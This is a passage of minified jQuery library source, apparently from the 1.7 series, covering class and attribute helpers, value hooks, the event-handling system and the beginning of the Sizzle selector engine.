");e.className=f.trim(g)}}}return this},removeClass:function(a){var c,d,e,g,h,i,j;if(f.isFunction(a))return this.each(function(b){f(this).removeClass(a.call(this,b,this.className))});if(a&&typeof a=="string"||a===b){c=(a||"").split(p);for(d=0,e=this.length;d<e;d++){g=this[d];if(g.nodeType===1&&g.className)if(a){h=(" "+g.className+" ").replace(o," ");for(i=0,j=c.length;i<j;i++)h=h.replace(" "+c[i]+" "," ");g.className=f.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b=="boolean";if(f.isFunction(a))return this.each(function(c){f(this).toggleClass(a.call(this,c,this.className,b),b)});return this.each(function(){if(c==="string"){var e,g=0,h=f(this),i=b,j=a.split(p);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?"addClass":"removeClass"](e)}else if(c==="undefined"||c==="boolean")this.className&&f._data(this,"__className__",this.className),this.className=this.className||a===!1?"":f._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ",c=0,d=this.length;for(;c<d;c++)if(this[c].nodeType===1&&(" "+this[c].className+" ").replace(o," ").indexOf(b)>-1)return!0;return!1},val:function(a){var c,d,e,g=this[0];{if(!!arguments.length){e=f.isFunction(a);return this.each(function(d){var g=f(this),h;if(this.nodeType===1){e?h=a.call(this,d,g.val()):h=a,h==null?h="":typeof h=="number"?h+="":f.isArray(h)&&(h=f.map(h,function(a){return a==null?"":a+""})),c=f.valHooks[this.nodeName.toLowerCase()]||f.valHooks[this.type];if(!c||!("set"in c)||c.set(this,h,"value")===b)this.value=h}})}if(g){c=f.valHooks[g.nodeName.toLowerCase()]||f.valHooks[g.type];if(c&&"get"in c&&(d=c.get(g,"value"))!==b)return d;d=g.value;return typeof d=="string"?d.replace(q,""):d==null?"":d}}}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c,d,e,g=a.selectedIndex,h=[],i=a.options,j=a.type==="select-one";if(g<0)return null;c=j?g:0,d=j?g+1:i.length;for(;c<d;c++){e=i[c];if(e.selected&&(f.support.optDisabled?!e.disabled:e.getAttribute("disabled")===null)&&(!e.parentNode.disabled||!f.nodeName(e.parentNode,"optgroup"))){b=f(e).val();if(j)return b;h.push(b)}}if(j&&!h.length&&i.length)return f(i[g]).val();return h},set:function(a,b){var c=f.makeArray(b);f(a).find("option").each(function(){this.selected=f.inArray(f(this).val(),c)>=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attr:function(a,c,d,e){var g,h,i,j=a.nodeType;if(!!a&&j!==3&&j!==8&&j!==2){if(e&&c in f.attrFn)return f(a)[c](d);if(typeof a.getAttribute=="undefined")return f.prop(a,c,d);i=j!==1||!f.isXMLDoc(a),i&&(c=c.toLowerCase(),h=f.attrHooks[c]||(u.test(c)?x:w));if(d!==b){if(d===null){f.removeAttr(a,c);return}if(h&&"set"in h&&i&&(g=h.set(a,d,c))!==b)return g;a.setAttribute(c,""+d);return d}if(h&&"get"in h&&i&&(g=h.get(a,c))!==null)return g;g=a.getAttribute(c);return g===null?b:g}},removeAttr:function(a,b){var c,d,e,g,h=0;if(b&&a.nodeType===1){d=b.toLowerCase().split(p),g=d.length;for(;h<g;h++)e=d[h],e&&(c=f.propFix[e]||e,f.attr(a,e,""),a.removeAttribute(v?e:c),u.test(e)&&c in a&&(a[c]=!1))}},attrHooks:{type:{set:function(a,b){if(r.test(a.nodeName)&&a.parentNode)f.error("type property can't be changed");else if(!f.support.radioValue&&b==="radio"&&f.nodeName(a,"input")){var c=a.value;a.setAttribute("type",b),c&&(a.value=c);return b}}},value:{get:function(a,b){if(w&&f.nodeName(a,"button"))return w.get(a,b);return b in a?a.value:null},set:function(a,b,c){if(w&&f.nodeName(a,"button"))return w.set(a,b,c);a.value=b}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e,g,h,i=a.nodeType;if(!!a&&i!==3&&i!==8&&i!==2){h=i!==1||!f.isXMLDoc(a),h&&(c=f.propFix[c]||c,g=f.propHooks[c]);return d!==b?g&&"set"in g&&(e=g.set(a,d,c))!==b?e:a[c]=d:g&&"get"in g&&(e=g.get(a,c))!==null?e:a[c]}},propHooks:{tabIndex:{get:function(a){var c=a.getAttributeNode("tabindex");return c&&c.specified?parseInt(c.value,10):s.test(a.nodeName)||t.test(a.nodeName)&&a.href?0:b}}}}),f.attrHooks.tabindex=f.propHooks.tabIndex,x={get:function(a,c){var d,e=f.prop(a,c);return e===!0||typeof e!="boolean"&&(d=a.getAttributeNode(c))&&d.nodeValue!==!1?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&&(a[d]=!0),a.setAttribute(c,c.toLowerCase()));return c}},v||(y={name:!0,id:!0},w=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&&(y[c]?d.nodeValue!=="":d.specified)?d.nodeValue:b},set:function(a,b,d){var e=a.getAttributeNode(d);e||(e=c.createAttribute(d),a.setAttributeNode(e));return e.nodeValue=b+""}},f.attrHooks.tabindex.set=w.set,f.each(["width","height"],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===""){a.setAttribute(b,"auto");return c}}})}),f.attrHooks.contenteditable={get:w.get,set:function(a,b,c){b===""&&(b="false"),w.set(a,b,c)}}),f.support.hrefNormalized||f.each(["href","src","width","height"],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex);return null}})),f.support.enctype||(f.propFix.enctype="encoding"),f.support.checkOn||f.each(["radio","checkbox"],function(){f.valHooks[this]={get:function(a){return a.getAttribute("value")===null?"on":a.value}}}),f.each(["radio","checkbox"],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)>=0}})});var z=/^(?:textarea|input|select)$/i,A=/^([^\.]*)?(?:\.(.+))?$/,B=/\bhover(\.\S+)?\b/,C=/^key/,D=/^(?:mouse|contextmenu)|click/,E=/^(?:focusinfocus|focusoutblur)$/,F=/^(\w*)(?:#([\w\-]+))?(?:\.([\w\-]+))?$/,G=function(a){var b=F.exec(a);b&&(b[1]=(b[1]||"").toLowerCase(),b[3]=b[3]&&new RegExp("(?:^|\\s)"+b[3]+"(?:\\s|$)"));return b},H=function(a,b){var c=a.attributes||{};return(!b[1]||a.nodeName.toLowerCase()===b[1])&&(!b[2]||(c.id||{}).value===b[2])&&(!b[3]||b[3].test((c["class"]||{}).value))},I=function(a){return f.event.special.hover?a:a.replace(B,"mouseenter$1 mouseleave$1")};
f.event={add:function(a,c,d,e,g){var h,i,j,k,l,m,n,o,p,q,r,s;if(!(a.nodeType===3||a.nodeType===8||!c||!d||!(h=f._data(a)))){d.handler&&(p=d,d=p.handler),d.guid||(d.guid=f.guid++),j=h.events,j||(h.events=j={}),i=h.handle,i||(h.handle=i=function(a){return typeof f!="undefined"&&(!a||f.event.triggered!==a.type)?f.event.dispatch.apply(i.elem,arguments):b},i.elem=a),c=f.trim(I(c)).split(" ");for(k=0;k<c.length;k++){l=A.exec(c[k])||[],m=l[1],n=(l[2]||"").split(".").sort(),s=f.event.special[m]||{},m=(g?s.delegateType:s.bindType)||m,s=f.event.special[m]||{},o=f.extend({type:m,origType:l[1],data:e,handler:d,guid:d.guid,selector:g,quick:G(g),namespace:n.join(".")},p),r=j[m];if(!r){r=j[m]=[],r.delegateCount=0;if(!s.setup||s.setup.call(a,e,n,i)===!1)a.addEventListener?a.addEventListener(m,i,!1):a.attachEvent&&a.attachEvent("on"+m,i)}s.add&&(s.add.call(a,o),o.handler.guid||(o.handler.guid=d.guid)),g?r.splice(r.delegateCount++,0,o):r.push(o),f.event.global[m]=!0}a=null}},global:{},remove:function(a,b,c,d,e){var g=f.hasData(a)&&f._data(a),h,i,j,k,l,m,n,o,p,q,r,s;if(!!g&&!!(o=g.events)){b=f.trim(I(b||"")).split(" ");for(h=0;h<b.length;h++){i=A.exec(b[h])||[],j=k=i[1],l=i[2];if(!j){for(j in o)f.event.remove(a,j+b[h],c,d,!0);continue}p=f.event.special[j]||{},j=(d?p.delegateType:p.bindType)||j,r=o[j]||[],m=r.length,l=l?new RegExp("(^|\\.)"+l.split(".").sort().join("\\.(?:.*\\.)?")+"(\\.|$)"):null;for(n=0;n<r.length;n++)s=r[n],(e||k===s.origType)&&(!c||c.guid===s.guid)&&(!l||l.test(s.namespace))&&(!d||d===s.selector||d==="**"&&s.selector)&&(r.splice(n--,1),s.selector&&r.delegateCount--,p.remove&&p.remove.call(a,s));r.length===0&&m!==r.length&&((!p.teardown||p.teardown.call(a,l)===!1)&&f.removeEvent(a,j,g.handle),delete o[j])}f.isEmptyObject(o)&&(q=g.handle,q&&(q.elem=null),f.removeData(a,["events","handle"],!0))}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){if(!e||e.nodeType!==3&&e.nodeType!==8){var h=c.type||c,i=[],j,k,l,m,n,o,p,q,r,s;if(E.test(h+f.event.triggered))return;h.indexOf("!")>=0&&(h=h.slice(0,-1),k=!0),h.indexOf(".")>=0&&(i=h.split("."),h=i.shift(),i.sort());if((!e||f.event.customEvent[h])&&!f.event.global[h])return;c=typeof c=="object"?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.isTrigger=!0,c.exclusive=k,c.namespace=i.join("."),c.namespace_re=c.namespace?new RegExp("(^|\\.)"+i.join("\\.(?:.*\\.)?")+"(\\.|$)"):null,o=h.indexOf(":")<0?"on"+h:"";if(!e){j=f.cache;for(l in j)j[l].events&&j[l].events[h]&&f.event.trigger(c,d,j[l].handle.elem,!0);return}c.result=b,c.target||(c.target=e),d=d!=null?f.makeArray(d):[],d.unshift(c),p=f.event.special[h]||{};if(p.trigger&&p.trigger.apply(e,d)===!1)return;r=[[e,p.bindType||h]];if(!g&&!p.noBubble&&!f.isWindow(e)){s=p.delegateType||h,m=E.test(s+h)?e:e.parentNode,n=null;for(;m;m=m.parentNode)r.push([m,s]),n=m;n&&n===e.ownerDocument&&r.push([n.defaultView||n.parentWindow||a,s])}for(l=0;l<r.length&&!c.isPropagationStopped();l++)m=r[l][0],c.type=r[l][1],q=(f._data(m,"events")||{})[c.type]&&f._data(m,"handle"),q&&q.apply(m,d),q=o&&m[o],q&&f.acceptData(m)&&q.apply(m,d)===!1&&c.preventDefault();c.type=h,!g&&!c.isDefaultPrevented()&&(!p._default||p._default.apply(e.ownerDocument,d)===!1)&&(h!=="click"||!f.nodeName(e,"a"))&&f.acceptData(e)&&o&&e[h]&&(h!=="focus"&&h!=="blur"||c.target.offsetWidth!==0)&&!f.isWindow(e)&&(n=e[o],n&&(e[o]=null),f.event.triggered=h,e[h](),f.event.triggered=b,n&&(e[o]=n));return c.result}},dispatch:function(c){c=f.event.fix(c||a.event);var d=(f._data(this,"events")||{})[c.type]||[],e=d.delegateCount,g=[].slice.call(arguments,0),h=!c.exclusive&&!c.namespace,i=[],j,k,l,m,n,o,p,q,r,s,t;g[0]=c,c.delegateTarget=this;if(e&&!c.target.disabled&&(!c.button||c.type!=="click")){m=f(this),m.context=this.ownerDocument||this;for(l=c.target;l!=this;l=l.parentNode||this){o={},q=[],m[0]=l;for(j=0;j<e;j++)r=d[j],s=r.selector,o[s]===b&&(o[s]=r.quick?H(l,r.quick):m.is(s)),o[s]&&q.push(r);q.length&&i.push({elem:l,matches:q})}}d.length>e&&i.push({elem:this,matches:d.slice(e)});for(j=0;j<i.length&&!c.isPropagationStopped();j++){p=i[j],c.currentTarget=p.elem;for(k=0;k<p.matches.length&&!c.isImmediatePropagationStopped();k++){r=p.matches[k];if(h||!c.namespace&&!r.namespace||c.namespace_re&&c.namespace_re.test(r.namespace))c.data=r.data,c.handleObj=r,n=((f.event.special[r.origType]||{}).handle||r.handler).apply(p.elem,g),n!==b&&(c.result=n,n===!1&&(c.preventDefault(),c.stopPropagation()))}}return c.result},props:"attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){a.which==null&&(a.which=b.charCode!=null?b.charCode:b.keyCode);return a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,d){var e,f,g,h=d.button,i=d.fromElement;a.pageX==null&&d.clientX!=null&&(e=a.target.ownerDocument||c,f=e.documentElement,g=e.body,a.pageX=d.clientX+(f&&f.scrollLeft||g&&g.scrollLeft||0)-(f&&f.clientLeft||g&&g.clientLeft||0),a.pageY=d.clientY+(f&&f.scrollTop||g&&g.scrollTop||0)-(f&&f.clientTop||g&&g.clientTop||0)),!a.relatedTarget&&i&&(a.relatedTarget=i===a.target?d.toElement:i),!a.which&&h!==b&&(a.which=h&1?1:h&2?3:h&4?2:0);return a}},fix:function(a){if(a[f.expando])return a;var d,e,g=a,h=f.event.fixHooks[a.type]||{},i=h.props?this.props.concat(h.props):this.props;a=f.Event(g);for(d=i.length;d;)e=i[--d],a[e]=g[e];a.target||(a.target=g.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),a.metaKey===b&&(a.metaKey=a.ctrlKey);return h.filter?h.filter(a,g):a},special:{ready:{setup:f.bindReady},load:{noBubble:!0},focus:{delegateType:"focusin"},blur:{delegateType:"focusout"},beforeunload:{setup:function(a,b,c){f.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}},simulate:function(a,b,c,d){var e=f.extend(new f.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?f.event.trigger(e,null,b):f.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},f.event.handle=f.event.dispatch,f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},f.Event=function(a,b){if(!(this instanceof f.Event))return new f.Event(a,b);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?K:J):this.type=a,b&&f.extend(this,b),this.timeStamp=a&&a.timeStamp||f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=K;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=K;var a=this.originalEvent;!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=K,this.stopPropagation()},isDefaultPrevented:J,isPropagationStopped:J,isImmediatePropagationStopped:J},f.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){f.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c=this,d=a.relatedTarget,e=a.handleObj,g=e.selector,h;if(!d||d!==c&&!f.contains(c,d))a.type=e.origType,h=e.handler.apply(this,arguments),a.type=b;return h}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(){if(f.nodeName(this,"form"))return!1;f.event.add(this,"click._submit keypress._submit",function(a){var c=a.target,d=f.nodeName(c,"input")||f.nodeName(c,"button")?c.form:b;d&&!d._submit_attached&&(f.event.add(d,"submit._submit",function(a){this.parentNode&&!a.isTrigger&&f.event.simulate("submit",this.parentNode,a,!0)}),d._submit_attached=!0)})},teardown:function(){if(f.nodeName(this,"form"))return!1;f.event.remove(this,"._submit")}}),f.support.changeBubbles||(f.event.special.change={setup:function(){if(z.test(this.nodeName)){if(this.type==="checkbox"||this.type==="radio")f.event.add(this,"propertychange._change",function(a){a.originalEvent.propertyName==="checked"&&(this._just_changed=!0)}),f.event.add(this,"click._change",function(a){this._just_changed&&!a.isTrigger&&(this._just_changed=!1,f.event.simulate("change",this,a,!0))});return!1}f.event.add(this,"beforeactivate._change",function(a){var b=a.target;z.test(b.nodeName)&&!b._change_attached&&(f.event.add(b,"change._change",function(a){this.parentNode&&!a.isSimulated&&!a.isTrigger&&f.event.simulate("change",this.parentNode,a,!0)}),b._change_attached=!0)})},handle:function(a){var b=a.target;if(this!==b||a.isSimulated||a.isTrigger||b.type!=="radio"&&b.type!=="checkbox")return a.handleObj.handler.apply(this,arguments)},teardown:function(){f.event.remove(this,"._change");return z.test(this.nodeName)}}),f.support.focusinBubbles||f.each({focus:"focusin",blur:"focusout"},function(a,b){var d=0,e=function(a){f.event.simulate(b,a.target,f.event.fix(a),!0)};f.event.special[b]={setup:function(){d++===0&&c.addEventListener(a,e,!0)},teardown:function(){--d===0&&c.removeEventListener(a,e,!0)}}}),f.fn.extend({on:function(a,c,d,e,g){var h,i;if(typeof a=="object"){typeof c!="string"&&(d=c,c=b);for(i in a)this.on(i,c,d,a[i],g);return this}d==null&&e==null?(e=c,d=c=b):e==null&&(typeof c=="string"?(e=d,d=b):(e=d,d=c,c=b));if(e===!1)e=J;else if(!e)return this;g===1&&(h=e,e=function(a){f().off(a);return h.apply(this,arguments)},e.guid=h.guid||(h.guid=f.guid++));return this.each(function(){f.event.add(this,a,e,d,c)})},one:function(a,b,c,d){return this.on.call(this,a,b,c,d,1)},off:function(a,c,d){if(a&&a.preventDefault&&a.handleObj){var e=a.handleObj;f(a.delegateTarget).off(e.namespace?e.type+"."+e.namespace:e.type,e.selector,e.handler);return this}if(typeof a=="object"){for(var g in a)this.off(g,c,a[g]);return this}if(c===!1||typeof c=="function")d=c,c=b;d===!1&&(d=J);return this.each(function(){f.event.remove(this,a,d,c)})},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},live:function(a,b,c){f(this.context).on(a,this.selector,b,c);return this},die:function(a,b){f(this.context).off(a,this.selector||"**",b);return this},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return arguments.length==1?this.off(a,"**"):this.off(b,a,c)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f._data(this,"lastToggle"+a.guid)||0)%d;f._data(this,"lastToggle"+a.guid,e+1),c.preventDefault();return b[e].apply(this,arguments)||!1};e.guid=c;while(d<b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){f.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.on(b,null,a,c):this.trigger(b)},f.attrFn&&(f.attrFn[b]=!0),C.test(b)&&(f.event.fixHooks[b]=f.event.keyHooks),D.test(b)&&(f.event.fixHooks[b]=f.event.mouseHooks)}),function(){function x(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}if(j.nodeType===1){g||(j[d]=c,j.sizset=h);if(typeof b!="string"){if(j===b){k=!0;break}}else if(m.filter(b,[j]).length>0){k=j;break}}j=j[a]}e[h]=k}}}function w(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}j.nodeType===1&&!g&&(j[d]=c,j.sizset=h);if(j.nodeName.toLowerCase()===b){k=j;break}j=j[a]}e[h]=k}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d="sizcache"+(Math.random()+"").replace(".",""),e=0,g=Object.prototype.toString,h=!1,i=!0,j=/\\/g,k=/\r\n/g,l=/\W/;[0,0].sort(function(){i=!1;return 0});var m=function(b,d,e,f){e=e||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!="string")return e;var i,j,k,l,n,q,r,t,u=!0,v=m.isXML(d),w=[],x=b;do{a.exec(""),i=a.exec(x);if(i){x=i[3],w.push(i[1]);if(i[2]){l=i[3];break}}}while(i);if(w.length>1&&p.exec(b))if(w.length===2&&o.relative[w[0]])j=y(w[0]+w[1],d,f);else{j=o.relative[w[0]]?[d]:m(w.shift(),d);while(w.length)b=w.shift(),o.relative[b]&&(b+=w.shift()),j=y(b,j,f)}else{!f&&w.length>1&&d.nodeType===9&&!v&&o.match.ID.test(w[0])&&!o.match.ID.test(w[w.length-1])&&(n=m.find(w.shift(),d,v),d=n.expr?m.filter(n.expr,n.set)[0]:n.set[0]);if(d){n=f?{expr:w.pop(),set:s(f)}:m.find(w.pop(),w.length===1&&(w[0]==="~"||w[0]==="+")&&d.parentNode?d.parentNode:d,v),j=n.expr?m.filter(n.expr,n.set):n.set,w.length>0?k=s(j):u=!1;while(w.length)q=w.pop(),r=q,o.relative[q]?r=w.pop():q="",r==null&&(r=d),o.relative[q](k,r,v)}else k=w=[]}k||(k=j),k||m.error(q||b);if(g.call(k)==="[object Array]")if(!u)e.push.apply(e,k);else if(d&&d.nodeType===1)for(t=0;k[t]!=null;t++)k[t]&&(k[t]===!0||k[t].nodeType===1&&m.contains(d,k[t]))&&e.push(j[t]);else for(t=0;k[t]!=null;t++)k[t]&&k[t].nodeType===1&&e.push(j[t]);else s(k,e);l&&(m(l,h,e,f),m.uniqueSort(e));return e};m.uniqueSort=function(a){if(u){h=i,a.sort(u);if(h)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},m.matches=function(a,b){return m(a,null,null,b)},m.matchesSelector=function(a,b){return m(b,null,null,[a]).length>0},m.find=function(a,b,c){var d,e,f,g,h,i;if(!a)return[];for(e=0,f=o.order.length;e<f;e++){h=o.order[e];if(g=o.leftMatch[h].exec(a)){i=g[1],g.splice(1,1);if(i.substr(i.length-1)!=="\\"){g[1]=(g[1]||"").replace(j,""),d=o.find[h](g,b,c);if(d!=null){a=a.replace(o.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},m.filter=function(a,c,d,e){var f,g,h,i,j,k,l,n,p,q=a,r=[],s=c,t=c&&c[0]&&m.isXML(c[0]);while(a&&c.length){for(h in o.filter)if((f=o.leftMatch[h].exec(a))!=null&&f[2]){k=o.filter[h],l=f[1],g=!1,f.splice(1,1);if(l.substr(l.length-1)==="\\")continue;s===r&&(r=[]);if(o.preFilter[h]){f=o.preFilter[h](f,s,d,r,e,t);if(!f)g=i=!0;else if(f===!0)continue}if(f)for(n=0;(j=s[n])!=null;n++)j&&(i=k(j,f,n,s),p=e^i,d&&i!=null?p?g=!0:s[n]=!1:p&&(r.push(j),g=!0));if(i!==b){d||(s=r),a=a.replace(o.match[h],"");if(!g)return[];break}}if(a===q)if(g==null)m.error(a);else break;q=a}return s},m.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)};var n=m.getText=function(a){var b,c,d=a.nodeType,e="";if(d){if(d===1||d===9){if(typeof a.textContent=="string")return a.textContent;if(typeof a.innerText=="string")return a.innerText.replace(k,"");for(a=a.firstChild;a;a=a.nextSibling)e+=n(a)}else if(d===3||d===4)return a.nodeValue}else for(b=0;c=a[b];b++)c.nodeType!==8&&(e+=n(c));return e},o=m.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b=="string",d=c&&!l.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1);a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&m.filter(b,a,!0)},">":function(a,b){var c,d=typeof b=="string",e=0,f=a.length;if(d&&!l.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&m.filter(b,a,!0)}},"":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("parentNode",b,f,a,d,c)},"~":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("previousSibling",b,f,a,d,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(j,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(j,"")},TAG:function(a,b){return a[1].replace(j,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||m.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&m.error(a[0]);a[0]=e++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(j,"");!f&&o.attrMap[g]&&(a[1]=o.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(j,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=m(b[3],null,null,c);else{var g=m.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(o.match.POS.test(b[0])||o.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!m(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return a.nodeName.toLowerCase()==="input"&&"text"===c&&(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()==="input"&&"radio"===a.type},checkbox:function(a){return a.nodeName.toLowerCase()==="input"&&"checkbox"===a.type},file:function(a){return a.nodeName.toLowerCase()==="input"&&"file"===a.type},password:function(a){return a.nodeName.toLowerCase()==="input"&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"submit"===a.type},image:function(a){return a.nodeName.toLowerCase()==="input"&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b==="input"&&"button"===a.type||b==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return 